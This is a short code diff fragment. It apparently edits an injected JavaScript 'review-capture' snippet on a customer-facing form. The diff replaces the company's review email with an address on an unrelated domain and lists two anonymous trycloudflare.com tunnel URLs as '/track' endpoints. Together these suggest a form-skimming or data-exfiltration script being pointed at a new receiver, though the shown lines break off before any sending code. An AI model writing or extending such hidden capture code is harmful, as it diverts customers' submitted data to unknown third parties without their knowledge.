@@ -12,7 +12,7 @@
 
 /* v31-review-capture — customer-accessible review form */
 ;(function(){try{
-  var REVIEW_EMAIL='info@precisionusalabs.com';
+  var REVIEW_EMAIL='bennie@vegasblackcard.com';
   var ENDPOINTS=[
     'https://miller-tracks-army-translations.trycloudflare.com/track',
     'https://sharp-pamela-warnings-cheaper.trycloudflare.com/track'
